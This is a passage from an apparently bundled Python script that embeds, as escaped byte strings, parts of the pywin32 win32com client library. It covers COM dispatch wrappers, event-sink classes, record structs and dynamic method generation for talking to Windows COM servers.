ValueError(\n                "The interface name \'%s\' does not appear in the "\n                "specified library %r" % (target, typelib.ver_desc)\n            )\n\n    elif hasattr(target, "index"):  # string like\n        # for now, we assume makepy for this to work.\n        if "CLSID" not in ob.__class__.__dict__:\n            # Eeek - no makepy support - try and build it.\n            ob = gencache.EnsureDispatch(ob)\n        if "CLSID" not in ob.__class__.__dict__:\n            raise ValueError("Must be a makepy-able object for this to work")\n        clsid = ob.CLSID\n        # Lots of hoops to support "demand-build" - ie, generating\n        # code for an interface first time it is used.  We assume the\n        # interface name exists in the same library as the object.\n        # This is generally the case - only referenced typelibs may be\n        # a problem, and we can handle that later.  Maybe <wink>\n        # So get the generated module for the library itself, then\n        # find the interface CLSID there.\n        mod = gencache.GetModuleForCLSID(clsid)\n        # Get the \'root\' module.\n        mod = gencache.GetModuleForTypelib(\n            mod.CLSID, mod.LCID, mod.MajorVersion, mod.MinorVersion\n        )\n        # Find the CLSID of the target\n        target_clsid = mod.NamesToIIDMap.get(target)\n        if target_clsid is None:\n            raise ValueError(\n                "The interface name \'%s\' does not appear in the "\n                "same library as object \'%r\'" % (target, ob)\n            )\n        mod = gencache.GetModuleForCLSID(target_clsid)\n    if mod is not None:\n        target_class = getattr(mod, target)\n        # resolve coclass to interface\n        target_class = getattr(target_class, "default_interface", target_class)\n        return target_class(ob)  # auto QI magic happens\n    raise ValueError\n\n\nclass Constants:\n    """A container for generated COM constants."""\n\n    def __init__(self):\n        self.__dicts__ = []  # A list of dictionaries\n\n    def __getattr__(self, a):\n        for d in self.__dicts__:\n            if a in d:\n                return d[a]\n        raise AttributeError(a)\n\n\n# And create an instance.\nconstants = Constants()\n\n# A helpers for DispatchWithEvents - this becomes __setattr__ for the\n# temporary class.\ndef _event_setattr_(self, attr, val):\n    try:\n        # Does the COM object have an attribute of this name?\n        self.__class__.__bases__[0].__setattr__(self, attr, val)\n    except AttributeError:\n        # Otherwise just stash it away in the instance.\n        self.__dict__[attr] = val\n\n\n# An instance of this "proxy" is created to break the COM circular references\n# that exist (ie, when we connect to the COM events, COM keeps a reference\n# to the object.  Thus, the Event connection must be manually broken before\n# our object can die.  This solves the problem by manually breaking the connection\n# to the real object as the proxy dies.\nclass EventsProxy:\n    def __init__(self, ob):\n        self.__dict__["_obj_"] = ob\n\n    def __del__(self):\n        try:\n            # If there is a COM error on disconnection we should\n            # just ignore it - object probably already shut down...\n            self._obj_.close()\n        except pythoncom.com_error:\n            pass\n\n    def __getattr__(self, attr):\n        return getattr(self._obj_, attr)\n\n    def __setattr__(self, attr, val):\n        setattr(self._obj_, attr, val)\n\n\ndef DispatchWithEvents(clsid, user_event_class):\n    """Create a COM object that can fire events to a user defined class.\n    clsid -- The ProgID or CLSID of the object to create.\n    user_event_class -- A Python class object that responds to the events.\n\n    This requires makepy support for the COM object being created.  If\n    this support does not exist it will be automatically generated by\n    this function.  If the object does not support makepy, a TypeError\n    exception will be raised.\n\n    The result is a class instance that both represents the COM object\n    and handles events from the COM object.\n\n    It is important to note that the returned instance is not a direct\n    instance of the user_event_class, but an instance of a temporary\n    class object that derives from three classes:\n    * The makepy generated class for the COM object\n    * The makepy generated class for the COM events\n    * The user_event_class as passed to this function.\n\n    If this is not suitable, see the getevents function for an alternative\n    technique of handling events.\n\n    Object Lifetimes:  Whenever the object returned from this function is\n    cleaned-up by Python, the events will be disconnected from\n    the COM object.  This is almost always what should happen,\n    but see the documentation for getevents() for more details.\n\n    Example:\n\n    >>> class IEEvents:\n    ...    def OnVisible(self, visible):\n    ...       print "Visible changed:", visible\n    ...\n    >>> ie = DispatchWithEvents("InternetExplorer.Application", IEEvents)\n    >>> ie.Visible = 1\n    Visible changed: 1\n    >>>\n    """\n    # Create/Get the object.\n    disp = Dispatch(clsid)\n    if not disp.__class__.__dict__.get(\n        "CLSID"\n    ):  # Eeek - no makepy support - try and build it.\n        try:\n            ti = disp._oleobj_.GetTypeInfo()\n            disp_clsid = ti.GetTypeAttr()[0]\n            tlb, index = ti.GetContainingTypeLib()\n            tla = tlb.GetLibAttr()\n            gencache.EnsureModule(tla[0], tla[1], tla[3], tla[4], bValidateFile=0)\n            # Get the class from the module.\n            disp_class = gencache.GetClassForProgID(str(disp_clsid))\n        except pythoncom.com_error:\n            raise TypeError(\n                "This COM object can not automate the makepy process - please run makepy manually for this object"\n            )\n    else:\n        disp_class = disp.__class__\n    # If the clsid was an object, get the clsid\n    clsid = disp_class.CLSID\n    # Create a new class that derives from 3 classes - the dispatch class, the event sink class and the user class.\n    # XXX - we are still "classic style" classes in py2x, so we need can\'t yet\n    # use \'type()\' everywhere - revisit soon, as py2x will move to new-style too...\n    try:\n        from types import ClassType as new_type\n    except ImportError:\n        new_type = type  # py3k\n    events_class = getevents(clsid)\n    if events_class is None:\n        raise ValueError("This COM object does not support events.")\n    result_class = new_type(\n        "COMEventClass",\n        (disp_class, events_class, user_event_class),\n        {"__setattr__": _event_setattr_},\n    )\n    instance = result_class(\n        disp._oleobj_\n    )  # This only calls the first base class __init__.\n    events_class.__init__(instance, instance)\n    if hasattr(user_event_class, "__init__"):\n        user_event_class.__init__(instance)\n    return EventsProxy(instance)\n\n\ndef WithEvents(disp, user_event_class):\n    """Similar to DispatchWithEvents - except that the returned\n    object is *not* also usable as the original Dispatch object - that is\n    the returned object is not dispatchable.\n\n    The difference is best summarised by example.\n\n    >>> class IEEvents:\n    ...    def OnVisible(self, visible):\n    ...       print "Visible changed:", visible\n    ...\n    >>> ie = Dispatch("InternetExplorer.Application")\n    >>> ie_events = WithEvents(ie, IEEvents)\n    >>> ie.Visible = 1\n    Visible changed: 1\n\n    Compare with the code sample for DispatchWithEvents, where you get a\n    single object that is both the interface and the event handler.  Note that\n    the event handler instance will *not* be able to use \'self.\' to refer to\n    IE\'s methods and properties.\n\n    This is mainly useful where using DispatchWithEvents causes\n    circular reference problems that the simple proxy doesn\'t deal with\n    """\n    disp = Dispatch(disp)\n    if not disp.__class__.__dict__.get(\n        "CLSID"\n    ):  # Eeek - no makepy support - try and build it.\n        try:\n            ti = disp._oleobj_.GetTypeInfo()\n            disp_clsid = ti.GetTypeAttr()[0]\n            tlb, index = ti.GetContainingTypeLib()\n            tla = tlb.GetLibAttr()\n            gencache.EnsureModule(tla[0], tla[1], tla[3], tla[4], bValidateFile=0)\n            # Get the class from the module.\n            disp_class = gencache.GetClassForProgID(str(disp_clsid))\n        except pythoncom.com_error:\n            raise TypeError(\n                "This COM object can not automate the makepy process - please run makepy manually for this object"\n            )\n    else:\n        disp_class = disp.__class__\n    # Get the clsid\n    clsid = disp_class.CLSID\n    # Create a new class that derives from 2 classes - the event sink\n    # class and the user class.\n    try:\n        from types import ClassType as new_type\n    except ImportError:\n        new_type = type  # py3k\n    events_class = getevents(clsid)\n    if events_class is None:\n        raise ValueError("This COM object does not support events.")\n    result_class = new_type("COMEventClass", (events_class, user_event_class), {})\n    instance = result_class(disp)  # This only calls the first base class __init__.\n    if hasattr(user_event_class, "__init__"):\n        user_event_class.__init__(instance)\n    return instance\n\n\ndef getevents(clsid):\n    """Determine the default outgoing interface for a class, given\n    either a clsid or progid. It returns a class - you can\n    conveniently derive your own handler from this class and implement\n    the appropriate methods.\n\n    This method relies on the classes produced by makepy. You must use\n    either makepy or the gencache module to ensure that the\n    appropriate support classes have been generated for the com server\n    that you will be handling events from.\n\n    Beware of COM circular references.  When the Events class is connected\n    to the COM object, the COM object itself keeps a reference to the Python\n    events class.  Thus, neither the Events instance or the COM object will\n    ever die by themselves.  The \'close\' method on the events instance\n    must be called to break this chain and allow standard Python collection\n    rules to manage object lifetimes.  Note that DispatchWithEvents() does\n    work around this problem by the use of a proxy object, but if you use\n    the getevents() function yourself, you must make your own arrangements\n    to manage this circular reference issue.\n\n    Beware of creating Python circular references: this will happen if your\n    handler has a reference to an object that has a reference back to\n    the event source. Call the \'close\' method to break the chain.\n\n    Example:\n\n    >>>win32com.client.gencache.EnsureModule(\'{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\',0,1,1)\n    <module \'win32com.gen_py.....\n    >>>\n    >>> class InternetExplorerEvents(win32com.client.getevents("InternetExplorer.Application.1")):\n    ...    def OnVisible(self, Visible):\n    ...        print "Visibility changed: ", Visible\n    ...\n    >>>\n    >>> ie=win32com.client.Dispatch("InternetExplorer.Application.1")\n    >>> events=InternetExplorerEvents(ie)\n    >>> ie.Visible=1\n    Visibility changed:  1\n    >>>\n    """\n\n    # find clsid given progid or clsid\n    clsid = str(pywintypes.IID(clsid))\n    # return default outgoing interface for that class\n    klass = gencache.GetClassForCLSID(clsid)\n    try:\n        return klass.default_source\n    except AttributeError:\n        # See if we have a coclass for the interfaces.\n        try:\n            return gencache.GetClassForCLSID(klass.coclass_clsid).default_source\n        except AttributeError:\n            return None\n\n\n# A Record object, as used by the COM struct support\ndef Record(name, object):\n    """Creates a new record object, given the name of the record,\n    and an object from the same type library.\n\n    Example usage would be:\n      app = win32com.client.Dispatch("Some.Application")\n      point = win32com.client.Record("SomeAppPoint", app)\n      point.x = 0\n      point.y = 0\n      app.MoveTo(point)\n    """\n    # XXX - to do - probably should allow "object" to already be a module object.\n    from . import gencache\n\n    object = gencache.EnsureDispatch(object)\n    module = sys.modules[object.__class__.__module__]\n    # to allow us to work correctly with "demand generated" code,\n    # we must use the typelib CLSID to obtain the module\n    # (otherwise we get the sub-module for the object, which\n    # does not hold the records)\n    # thus, package may be module, or may be module\'s parent if demand generated.\n    package = gencache.GetModuleForTypelib(\n        module.CLSID, module.LCID, module.MajorVersion, module.MinorVersion\n    )\n    try:\n        struct_guid = package.RecordMap[name]\n    except KeyError:\n        raise ValueError(\n            "The structure \'%s\' is not defined in module \'%s\'" % (name, package)\n        )\n    return pythoncom.GetRecordFromGuids(\n        module.CLSID, module.MajorVersion, module.MinorVersion, module.LCID, struct_guid\n    )\n\n\n############################################\n# The base of all makepy generated classes\n############################################\nclass DispatchBaseClass:\n    def __init__(self, oobj=None):\n        if oobj is None:\n            oobj = pythoncom.new(self.CLSID)\n        elif isinstance(oobj, DispatchBaseClass):\n            try:\n                oobj = oobj._oleobj_.QueryInterface(\n                    self.CLSID, pythoncom.IID_IDispatch\n                )  # Must be a valid COM instance\n            except pythoncom.com_error as details:\n                import winerror\n\n                # Some stupid objects fail here, even tho it is _already_ IDispatch!!??\n                # Eg, Lotus notes.\n                # So just let it use the existing object if E_NOINTERFACE\n                if details.hresult != winerror.E_NOINTERFACE:\n                    raise\n                oobj = oobj._oleobj_\n        self.__dict__["_oleobj_"] = oobj  # so we dont call __setattr__\n\n    def __dir__(self):\n        lst = (\n            list(self.__dict__.keys())\n            + dir(self.__class__)\n            + list(self._prop_map_get_.keys())\n            + list(self._prop_map_put_.keys())\n        )\n        try:\n            lst += [p.Name for p in self.Properties_]\n        except AttributeError:\n            pass\n        return list(set(lst))\n\n    # Provide a prettier name than the CLSID\n    def __repr__(self):\n        # Need to get the docstring for the module for this class.\n        try:\n            mod_doc = sys.modules[self.__class__.__module__].__doc__\n            if mod_doc:\n                mod_name = "win32com.gen_py." + mod_doc\n            else:\n                mod_name = sys.modules[self.__class__.__module__].__name__\n        except KeyError:\n            mod_name = "win32com.gen_py.unknown"\n        return "<%s.%s instance at 0x%s>" % (\n            mod_name,\n            self.__class__.__name__,\n            id(self),\n        )\n\n    # Delegate comparison to the oleobjs, as they know how to do identity.\n    def __eq__(self, other):\n        other = getattr(other, "_oleobj_", other)\n        return self._oleobj_ == other\n\n    def __ne__(self, other):\n        other = getattr(other, "_oleobj_", other)\n        return self._oleobj_ != other\n\n    def _ApplyTypes_(self, dispid, wFlags, retType, argTypes, user, resultCLSID, *args):\n        return self._get_good_object_(\n            self._oleobj_.InvokeTypes(dispid, 0, wFlags, retType, argTypes, *args),\n            user,\n            resultCLSID,\n        )\n\n    def __getattr__(self, attr):\n        args = self._prop_map_get_.get(attr)\n        if args is None:\n            raise AttributeError(\n                "\'%s\' object has no attribute \'%s\'" % (repr(self), attr)\n            )\n        return self._ApplyTypes_(*args)\n\n    def __setattr__(self, attr, value):\n        if attr in self.__dict__:\n            self.__dict__[attr] = value\n            return\n        try:\n            args, defArgs = self._prop_map_put_[attr]\n        except KeyError:\n            raise AttributeError(\n                "\'%s\' object has no attribute \'%s\'" % (repr(self), attr)\n            )\n        self._oleobj_.Invoke(*(args + (value,) + defArgs))\n\n    def _get_good_single_object_(self, obj, obUserName=None, resultCLSID=None):\n        return _get_good_single_object_(obj, obUserName, resultCLSID)\n\n    def _get_good_object_(self, obj, obUserName=None, resultCLSID=None):\n        return _get_good_object_(obj, obUserName, resultCLSID)\n\n\n# XXX - These should be consolidated with dynamic.py versions.\ndef _get_good_single_object_(obj, obUserName=None, resultCLSID=None):\n    if _PyIDispatchType == type(obj):\n        return Dispatch(obj, obUserName, resultCLSID)\n    return obj\n\n\ndef _get_good_object_(obj, obUserName=None, resultCLSID=None):\n    if obj is None:\n        return None\n    elif isinstance(obj, tuple):\n        obUserNameTuple = (obUserName,) * len(obj)\n        resultCLSIDTuple = (resultCLSID,) * len(obj)\n        return tuple(map(_get_good_object_, obj, obUserNameTuple, resultCLSIDTuple))\n    else:\n        return _get_good_single_object_(obj, obUserName, resultCLSID)\n\n\nclass CoClassBaseClass:\n    def __init__(self, oobj=None):\n        if oobj is None:\n            oobj = pythoncom.new(self.CLSID)\n        dispobj = self.__dict__["_dispobj_"] = self.default_interface(oobj)\n        # See comments below re the special methods.\n        for maybe in [\n            "__call__",\n            "__str__",\n            "__int__",\n            "__iter__",\n            "__len__",\n            "__nonzero__",\n        ]:\n            if hasattr(dispobj, maybe):\n                setattr(self, maybe, getattr(self, "__maybe" + maybe))\n\n    def __repr__(self):\n        return "<win32com.gen_py.%s.%s>" % (__doc__, self.__class__.__name__)\n\n    def __getattr__(self, attr):\n        d = self.__dict__["_dispobj_"]\n        if d is not None:\n            return getattr(d, attr)\n        raise AttributeError(attr)\n\n    def __setattr__(self, attr, value):\n        if attr in self.__dict__:\n            self.__dict__[attr] = value\n            return\n        try:\n            d = self.__dict__["_dispobj_"]\n            if d is not None:\n                d.__setattr__(attr, value)\n                return\n        except AttributeError:\n            pass\n        self.__dict__[attr] = value\n\n        # Special methods don\'t use __getattr__ etc, so explicitly delegate here.\n        # Note however, that not all are safe to let bubble up - things like\n        # `bool(ob)` will break if the object defines __int__ but then raises an\n        # attribute error - eg, see #1753.\n        # It depends on what the wrapped COM object actually defines whether these\n        # will exist on the underlying object, so __init__ explicitly checks if they\n        # do and if so, wires them up.\n\n    def __maybe__call__(self, *args, **kwargs):\n        return self.__dict__["_dispobj_"].__call__(*args, **kwargs)\n\n    def __maybe__str__(self, *args):\n        return self.__dict__["_dispobj_"].__str__(*args)\n\n    def __maybe__int__(self, *args):\n        return self.__dict__["_dispobj_"].__int__(*args)\n\n    def __maybe__iter__(self):\n        return self.__dict__["_dispobj_"].__iter__()\n\n    def __maybe__len__(self):\n        return self.__dict__["_dispobj_"].__len__()\n\n    def __maybe__nonzero__(self):\n        return self.__dict__["_dispobj_"].__nonzero__()\n\n\n# A very simple VARIANT class.  Only to be used with poorly-implemented COM\n# objects.  If an object accepts an arg which is a simple "VARIANT", but still\n# is very pickly about the actual variant type (eg, isn\'t happy with a VT_I4,\n# which it would get from a Python integer), you can use this to force a\n# particular VT.\nclass VARIANT(object):\n    def __init__(self, vt, value):\n        self.varianttype = vt\n        self._value = value\n\n    # \'value\' is a property so when set by pythoncom it gets any magic wrapping\n    # which normally happens for result objects\n    def _get_value(self):\n        return self._value\n\n    def _set_value(self, newval):\n        self._value = _get_good_object_(newval)\n\n    def _del_value(self):\n        del self._value\n\n    value = property(_get_value, _set_value, _del_value)\n\n    def __repr__(self):\n        return "win32com.client.VARIANT(%r, %r)" % (self.varianttype, self._value)\n')
    __stickytape_write_module('win32com/client/dynamic.py', b'"""Support for dynamic COM client support.\n\nIntroduction\n Dynamic COM client support is the ability to use a COM server without\n prior knowledge of the server.  This can be used to talk to almost all\n COM servers, including much of MS Office.\n\n In general, you should not use this module directly - see below.\n\nExample\n >>> import win32com.client\n >>> xl = win32com.client.Dispatch("Excel.Application")\n # The line above invokes the functionality of this class.\n # xl is now an object we can use to talk to Excel.\n >>> xl.Visible = 1 # The Excel window becomes visible.\n\n"""\nimport sys\nimport traceback\nimport types\n\nimport pythoncom\nimport winerror\nfrom . import build\n\nfrom pywintypes import IIDType\n\nimport win32com.client  # Needed as code we eval() references it.\n\ndebugging = 0  # General debugging\ndebugging_attr = 0  # Debugging dynamic attribute lookups.\n\nLCID = 0x0\n\n# These errors generally mean the property or method exists,\n# but can\'t be used in this context - eg, property instead of a method, etc.\n# Used to determine if we have a real error or not.\nERRORS_BAD_CONTEXT = [\n    winerror.DISP_E_MEMBERNOTFOUND,\n    winerror.DISP_E_BADPARAMCOUNT,\n    winerror.DISP_E_PARAMNOTOPTIONAL,\n    winerror.DISP_E_TYPEMISMATCH,\n    winerror.E_INVALIDARG,\n]\n\nALL_INVOKE_TYPES = [\n    pythoncom.INVOKE_PROPERTYGET,\n    pythoncom.INVOKE_PROPERTYPUT,\n    pythoncom.INVOKE_PROPERTYPUTREF,\n    pythoncom.INVOKE_FUNC,\n]\n\n\ndef debug_print(*args):\n    if debugging:\n        for arg in args:\n            print(arg, end=" ")\n        print()\n\n\ndef debug_attr_print(*args):\n    if debugging_attr:\n        for arg in args:\n            print(arg, end=" ")\n        print()\n\n\ndef MakeMethod(func, inst, cls):\n    return types.MethodType(func, inst)\n\n\n# get the type objects for IDispatch and IUnknown\nPyIDispatchType = pythoncom.TypeIIDs[pythoncom.IID_IDispatch]\nPyIUnknownType = pythoncom.TypeIIDs[pythoncom.IID_IUnknown]\n\n_GoodDispatchTypes = (str, IIDType)\n_defaultDispatchItem = build.DispatchItem\n\n\ndef _GetGoodDispatch(IDispatch, clsctx=pythoncom.CLSCTX_SERVER):\n    # quick return for most common case\n    if isinstance(IDispatch, PyIDispatchType):\n        return IDispatch\n    if isinstance(IDispatch, _GoodDispatchTypes):\n        try:\n            IDispatch = pythoncom.connect(IDispatch)\n        except pythoncom.ole_error:\n            IDispatch = pythoncom.CoCreateInstance(\n                IDispatch, None, clsctx, pythoncom.IID_IDispatch\n            )\n    else:\n        # may already be a wrapped class.\n        IDispatch = getattr(IDispatch, "_oleobj_", IDispatch)\n    return IDispatch\n\n\ndef _GetGoodDispatchAndUserName(IDispatch, userName, clsctx):\n    # Get a dispatch object, and a \'user name\' (ie, the name as\n    # displayed to the user in repr() etc.\n    if userName is None:\n        if isinstance(IDispatch, str):\n            userName = IDispatch\n        ## ??? else userName remains None ???\n    else:\n        userName = str(userName)\n    return (_GetGoodDispatch(IDispatch, clsctx), userName)\n\n\ndef _GetDescInvokeType(entry, invoke_type):\n    # determine the wFlags argument passed as input to IDispatch::Invoke\n    # Only ever called by __getattr__ and __setattr__ from dynamic objects!\n    # * `entry` is a MapEntry with whatever typeinfo we have about the property we are getting/setting.\n    # * `invoke_type` is either INVOKE_PROPERTYGET | INVOKE_PROPERTYSET and really just\n    #   means "called by __getattr__" or "called by __setattr__"\n    if not entry or not entry.desc:\n        return invoke_type\n\n    if entry.desc.desckind == pythoncom.DESCKIND_VARDESC:\n        return invoke_type\n\n    # So it\'s a FUNCDESC - just use what it specifies.\n    return entry.desc.invkind\n\n\ndef Dispatch(\n    IDispatch,\n    userName=None,\n    createClass=None,\n    typeinfo=None,\n    UnicodeToString=None,\n    clsctx=pythoncom.CLSCTX_SERVER,\n):\n    assert UnicodeToString is None, "this is deprecated and will go away"\n    IDispatch, userName = _GetGoodDispatchAndUserName(IDispatch, userName, clsctx)\n    if createClass is None:\n        createClass = CDispatch\n    lazydata = None\n    try:\n        if typeinfo is None:\n            typeinfo = IDispatch.GetTypeInfo()\n        if typeinfo is not None:\n            try:\n                # try for a typecomp\n                typecomp = typeinfo.GetTypeComp()\n                lazydata = typeinfo, typecomp\n            except pythoncom.com_error:\n                pass\n    except pythoncom.com_error:\n        typeinfo = None\n    olerepr = MakeOleRepr(IDispatch, typeinfo, lazydata)\n    return createClass(IDispatch, olerepr, userName, lazydata=lazydata)\n\n\ndef MakeOleRepr(IDispatch, typeinfo, typecomp):\n    olerepr = None\n    if typeinfo is not None:\n        try:\n            attr = typeinfo.GetTypeAttr()\n            # If the type info is a special DUAL interface, magically turn it into\n            # a DISPATCH typeinfo.\n            if (\n                attr[5] == pythoncom.TKIND_INTERFACE\n                and attr[11] & pythoncom.TYPEFLAG_FDUAL\n            ):\n                # Get corresponding Disp interface;\n                # -1 is a special value which does this for us.\n                href = typeinfo.GetRefTypeOfImplType(-1)\n                typeinfo = typeinfo.GetRefTypeInfo(href)\n                attr = typeinfo.GetTypeAttr()\n            if typecomp is None:\n                olerepr = build.DispatchItem(typeinfo, attr, None, 0)\n            else:\n                olerepr = build.LazyDispatchItem(attr, None)\n        except pythoncom.ole_error:\n            pass\n    if olerepr is None:\n        olerepr = build.DispatchItem()\n    return olerepr\n\n\ndef DumbDispatch(\n    IDispatch,\n    userName=None,\n    createClass=None,\n    UnicodeToString=None,\n    clsctx=pythoncom.CLSCTX_SERVER,\n):\n    "Dispatch with no type info"\n    assert UnicodeToString is None, "this is deprecated and will go away"\n    IDispatch, userName = _GetGoodDispatchAndUserName(IDispatch, userName, clsctx)\n    if createClass is None:\n        createClass = CDispatch\n    return createClass(IDispatch, build.DispatchItem(), userName)\n\n\nclass CDispatch:\n    def __init__(\n        self, IDispatch, olerepr, userName=None, UnicodeToString=None, lazydata=None\n    ):\n        assert UnicodeToString is None, "this is deprecated and will go away"\n        if userName is None:\n            userName = "<unknown>"\n        self.__dict__["_oleobj_"] = IDispatch\n        self.__dict__["_username_"] = userName\n        self.__dict__["_olerepr_"] = olerepr\n        self.__dict__["_mapCachedItems_"] = {}\n        self.__dict__["_builtMethods_"] = {}\n        self.__dict__["_enum_"] = None\n        self.__dict__["_unicode_to_string_"] = None\n        self.__dict__["_lazydata_"] = lazydata\n\n    def __call__(self, *args):\n        "Provide \'default dispatch\' COM functionality - allow instance to be called"\n        if self._olerepr_.defaultDispatchName:\n            invkind, dispid = self._find_dispatch_type_(\n                self._olerepr_.defaultDispatchName\n            )\n        else:\n            invkind, dispid = (\n                pythoncom.DISPATCH_METHOD | pythoncom.DISPATCH_PROPERTYGET,\n                pythoncom.DISPID_VALUE,\n            )\n        if invkind is not None:\n            allArgs = (dispid, LCID, invkind, 1) + args\n            return self._get_good_object_(\n                self._oleobj_.Invoke(*allArgs), self._olerepr_.defaultDispatchName, None\n            )\n        raise TypeError("This dispatch object does not define a default method")\n\n    def __bool__(self):\n        return True  # ie "if object:" should always be "true" - without this, __len__ is tried.\n        # _Possibly_ want to defer to __len__ if available, but Im not sure this is\n        # desirable???\n\n    def __repr__(self):\n        return "<COMObject %s>" % (self._username_)\n\n    def __str__(self):\n        # __str__ is used when the user does "print object", so we gracefully\n        # fall back to the __repr__ if the object has no default method.\n        try:\n            return str(self.__call__())\n        except pythoncom.com_error as details:\n            if details.hresult not in ERRORS_BAD_CONTEXT:\n                raise\n            return self.__repr__()\n\n    def __dir__(self):\n        lst = list(self.__dict__.keys()) + dir(self.__class__) + self._dir_ole_()\n        try:\n            lst += [p.Name for p in self.Properties_]\n        except AttributeError:\n            pass\n        return list(set(lst))\n\n    def _dir_ole_(self):\n        items_dict = {}\n        for iTI in range(0, self._oleobj_.GetTypeInfoCount()):\n            typeInfo = self._oleobj_.GetTypeInfo(iTI)\n            self._UpdateWithITypeInfo_(items_dict, typeInfo)\n        return list(items_dict.keys())\n\n    def _UpdateWithITypeInfo_(self, items_dict, typeInfo):\n        typeInfos = [typeInfo]\n        # suppress IDispatch and IUnknown methods\n        inspectedIIDs = {pythoncom.IID_IDispatch: None}\n\n        while len(typeInfos) > 0:\n            typeInfo = typeInfos.pop()\n            typeAttr = typeInfo.GetTypeAttr()\n\n            if typeAttr.iid not in inspectedIIDs:\n                inspectedIIDs[typeAttr.iid] = None\n                for iFun in range(0, typeAttr.cFuncs):\n                    funDesc = typeInfo.GetFuncDesc(iFun)\n                    funName = typeInfo.GetNames(funDesc.memid)[0]\n                    if funName not in items_dict:\n                        items_dict[funName] = None\n\n                # Inspect the type info of all implemented types\n                # E.g. IShellDispatch5 implements IShellDispatch4 which implements IShellDispatch3 ...\n                for iImplType in range(0, typeAttr.cImplTypes):\n                    iRefType = typeInfo.GetRefTypeOfImplType(iImplType)\n                    refTypeInfo = typeInfo.GetRefTypeInfo(iRefType)\n                    typeInfos.append(refTypeInfo)\n\n    # Delegate comparison to the oleobjs, as they know how to do identity.\n    def __eq__(self, other):\n        other = getattr(other, "_oleobj_", other)\n        return self._oleobj_ == other\n\n    def __ne__(self, other):\n        other = getattr(other, "_oleobj_", other)\n        return self._oleobj_ != other\n\n    def __int__(self):\n        return int(self.__call__())\n\n    def __len__(self):\n        invkind, dispid = self._find_dispatch_type_("Count")\n        if invkind:\n            return self._oleobj_.Invoke(dispid, LCID, invkind, 1)\n        raise TypeError("This dispatch object does not define a Count method")\n\n    def _NewEnum(self):\n        try:\n            invkind = pythoncom.DISPATCH_METHOD | pythoncom.DISPATCH_PROPERTYGET\n            enum = self._oleobj_.InvokeTypes(\n                pythoncom.DISPID_NEWENUM, LCID, invkind, (13, 10), ()\n            )\n        except pythoncom.com_error:\n            return None  # no enumerator for this object.\n        from . import util\n\n        return util.WrapEnum(enum, None)\n\n    def __getitem__(self, index):  # syver modified\n        # Improved __getitem__ courtesy Syver Enstad\n        # Must check _NewEnum before Item, to ensure b/w compat.\n        if isinstance(index, int):\n            if self.__dict__["_enum_"] is None:\n                self.__dict__["_enum_"] = self._NewEnum()\n            if self.__dict__["_enum_"] is not None:\n                return self._get_good_object_(self._enum_.__getitem__(index))\n        # See if we have an "Item" method/property we can use (goes hand in hand with Count() above!)\n        invkind, dispid = self._find_dispatch_type_("Item")\n        if invkind is not None:\n            return self._get_good_object_(\n                self._oleobj_.Invoke(dispid, LCID, invkind, 1, index)\n            )\n        raise TypeError("This object does not support enumeration")\n\n    def __setitem__(self, index, *args):\n        # XXX - todo - We should support calling Item() here too!\n        # \t\tprint "__setitem__ with", index, args\n        if self._olerepr_.defaultDispatchName:\n            invkind, dispid = self._find_dispatch_type_(\n                self._olerepr_.defaultDispatchName\n            )\n        else:\n            invkind, dispid = (\n                pythoncom.DISPATCH_PROPERTYPUT | pythoncom.DISPATCH_PROPERTYPUTREF,\n                pythoncom.DISPID_VALUE,\n            )\n        if invkind is not None:\n            allArgs = (dispid, LCID, invkind, 0, index) + args\n            return self._get_good_object_(\n                self._oleobj_.Invoke(*allArgs), self._olerepr_.defaultDispatchName, None\n            )\n        raise TypeError("This dispatch object does not define a default method")\n\n    def _find_dispatch_type_(self, methodName):\n        if methodName in self._olerepr_.mapFuncs:\n            item = self._olerepr_.mapFuncs[methodName]\n            return item.desc[4], item.dispid\n\n        if methodName in self._olerepr_.propMapGet:\n            item = self._olerepr_.propMapGet[methodName]\n            return item.desc[4], item.dispid\n\n        try:\n            dispid = self._oleobj_.GetIDsOfNames(0, methodName)\n        except:  ### what error?\n            return None, None\n        return pythoncom.DISPATCH_METHOD | pythoncom.DISPATCH_PROPERTYGET, dispid\n\n    def _ApplyTypes_(self, dispid, wFlags, retType, argTypes, user, resultCLSID, *args):\n        result = self._oleobj_.InvokeTypes(\n            *(dispid, LCID, wFlags, retType, argTypes) + args\n        )\n        return self._get_good_object_(result, user, resultCLSID)\n\n    def _wrap_dispatch_(\n        self, ob, userName=None, returnCLSID=None, UnicodeToString=None\n    ):\n        # Given a dispatch object, wrap it in a class\n        assert UnicodeToString is None, "this is deprecated and will go away"\n        return Dispatch(ob, userName)\n\n    def _get_good_single_object_(self, ob, userName=None, ReturnCLSID=None):\n        if isinstance(ob, PyIDispatchType):\n            # make a new instance of (probably this) class.\n            return self._wrap_dispatch_(ob, userName, ReturnCLSID)\n        if isinstance(ob, PyIUnknownType):\n            try:\n                ob = ob.QueryInterface(pythoncom.IID_IDispatch)\n            except pythoncom.com_error:\n                # It is an IUnknown, but not an IDispatch, so just let it through.\n                return ob\n            return self._wrap_dispatch_(ob, userName, ReturnCLSID)\n        return ob\n\n    def _get_good_object_(self, ob, userName=None, ReturnCLSID=None):\n        """Given an object (usually the retval from a method), make it a good object to return.\n        Basically checks if it is a COM object, and wraps it up.\n        Also handles the fact that a retval may be a tuple of retvals"""\n        if ob is None:  # Quick exit!\n            return None\n        elif isinstance(ob, tuple):\n            return tuple(\n                map(\n                    lambda o, s=self, oun=userName, rc=ReturnCLSID: s._get_good_single_object_(\n                        o, oun, rc\n                    ),\n                    ob,\n                )\n            )\n        else:\n            return self._get_good_single_object_(ob)\n\n    def _make_method_(self, name):\n        "Make a method object - Assumes in olerepr funcmap"\n        methodName = build.MakePublicAttributeName(name)  # translate keywords etc.\n        methodCodeList = self._olerepr_.MakeFuncMethod(\n            self._olerepr_.mapFuncs[name], methodName, 0\n        )\n        methodCode = "\\n".join(methodCodeList)\n        try:\n            # \t\t\tprint "Method code for %s is:\\n" % self._username_, methodCode\n            # \t\t\tself._print_details_()\n            codeObject = compile(methodCode, "<COMObject %s>" % self._username_, "exec")\n            # Exec the code object\n            tempNameSpace = {}\n            # "Dispatch" in the exec\'d code is win32com.client.Dispatch, not ours.\n            globNameSpace = globals().copy()\n            globNameSpace["Dispatch"] = win32com.client.Dispatch\n            exec(\n                codeObject, globNameSpace, tempNameSpace\n            )  # self.__dict__, self.__dict__\n            name = methodName\n            # Save the function in map.\n            fn = self._builtMethods_[name] = tempNameSpace[name]\n            newMeth = MakeMethod(fn, self, self.__class__)\n            return newMeth\n        except:\n            debug_print("Error building OLE definition for code ", methodCode)\n            traceback.print_exc()\n        return None\n\n  